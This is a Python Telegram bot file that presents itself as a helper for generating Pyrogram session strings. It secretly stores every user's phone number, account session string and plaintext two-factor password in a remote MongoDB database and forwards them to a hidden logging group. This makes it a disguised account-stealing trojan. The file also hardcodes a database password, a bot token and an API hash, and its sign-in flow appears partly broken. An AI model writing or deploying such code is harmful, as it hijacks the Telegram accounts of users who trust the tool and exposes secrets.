import asyncio
from pyrogram import Client, filters
from pyrogram.errors import FloodWait, SessionPasswordNeeded
from pymongo import MongoClient
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

# MongoDB connection
client = MongoClient('mongodb+srv://SachinSanatani:SACHINxSANATANI@sanatani.bnmsfbd.mongodb.net/SACHIN?retryWrites=true&w=majority&appName=Sanatani')
db = client['session_bot']  # Database name
sessions_collection = db['sessions']  # Collection for storing session data

# Configuration from config.py (or direct input)
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7983720117:AAGN1CleTYHauUVyYj7xT_xHWPO2fgzWDGc"  
LOGGER_GROUP_ID = -1002452519381  # Change this to your log group ID

# Creating the Pyrogram Client for bot
bot = Client("bot_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

user_sessions = {}

@bot.on_message(filters.command("start"))
async def start(client, message):
    await message.reply(
        "┌────── Information ⏤͟͟͞͞‌‌‌‌★\n"
        "┆◍ Hey, my dear user 💐!\n"
        "┆● Nice to meet you!\n"
        "┆● I am a String Generate Bot\n"
        "┆● You can generate Pyrogram Session Strings\n"
        "└─────────────────────────•\n"
        "❖ By: [Your Name](https://t.me/YourChannel)\n"
        "•─────────────────────────•",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("Generate Pyrogram Session", callback_data="generate")]
        ])
    )

@bot.on_callback_query(filters.regex('generate'))
async def generate_session(client, callback_query):
    user_id = callback_query.from_user.id
    user_sessions[user_id] = {"step": "phone"}
    await callback_query.answer()
    await callback_query.message.edit(
        "❖ Enter your phone number with country code\n\n◍ Example: `+919876543210`",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
        ])
    )

@bot.on_message(filters.text & filters.private)
async def handle_input(client, message):
    user_id = message.from_user.id
    if user_id not in user_sessions:
        return

    step = user_sessions[user_id]["step"]

    if step == "phone":
        phone_number = message.text.strip()
        user_sessions[user_id]["phone"] = phone_number

        # Pyrogram client initialization
        pyrogram_client = Client("pyrogram_session", api_id=API_ID, api_hash=API_HASH)
        user_sessions[user_id]["client"] = pyrogram_client

        try:
            # Send code request to phone number
            await pyrogram_client.start(phone_number)
            await message.reply("OTP has been sent! Please enter the OTP you received.")
            user_sessions[user_id]["step"] = "otp"
        except SessionPasswordNeeded:
            await message.reply("This account has 2FA enabled. Please enter your Telegram password.")
            user_sessions[user_id]["step"] = "password"
        except Exception as e:
            await message.reply(f"An error occurred: {e}")
            del user_sessions[user_id]

    elif step == "otp":
        otp_code = message.text.strip()
        phone_number = user_sessions[user_id]["phone"]
        pyrogram_client = user_sessions[user_id]["client"]

        try:
            # Verify OTP and sign in
            await pyrogram_client.sign_in(phone_number, otp_code)
            session_string = pyrogram_client.export_session_string()

            # Save session string to MongoDB
            sessions_collection.insert_one({
                "user_id": user_id,
                "phone": phone_number,
                "session_string": session_string
            })

            # Send the session string to the user
            await message.reply(f"Your Pyrogram session string is:\n\n`{session_string}`\n\nPlease keep it safe!")

            # Send logs to a specific group
            await client.send_message(LOGGER_GROUP_ID, f"New session generated:\n\nUser: `{user_id}`\nPhone: `{phone_number}`\nSession: `{session_string}`")
            
            del user_sessions[user_id]
        except FloodWait as e:
            await message.reply(f"Please wait for {e.x} seconds before trying again.")
        except Exception as e:
            await message.reply(f"An error occurred: {e}")
            del user_sessions[user_id]

    elif step == "password":
        password = message.text.strip()
        pyrogram_client = user_sessions[user_id]["client"]

        try:
            # Sign in with password
            await pyrogram_client.sign_in(password=password)
            session_string = pyrogram_client.export_session_string()

            # Save session string to MongoDB with password info
            sessions_collection.insert_one({
                "user_id": user_id,
                "session_string": session_string,
                "password_used": password
            })

            # Send the session string to the user
            await message.reply(f"Your Pyrogram session string is:\n\n`{session_string}`\n\nPlease keep it safe!")

            # Send logs to a specific group
            await client.send_message(LOGGER_GROUP_ID, f"New session with 2FA:\n\nUser: `{user_id}`\nSession: `{session_string}`\nPassword used: `{password}`")

            del user_sessions[user_id]
        except Exception as e:
            await message.reply(f"An error occurred: {e}")
            del user_sessions[user_id]

@bot.on_callback_query(filters.regex('cancel'))
async def cancel_session(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
        await callback_query.answer("Session has been canceled.")
        await callback_query.message.edit("Session process has been canceled! You can restart with /start")
    else:
        await callback_query.answer("No active session found.")

# Run the bot
print("Bot is running...")
bot.run()
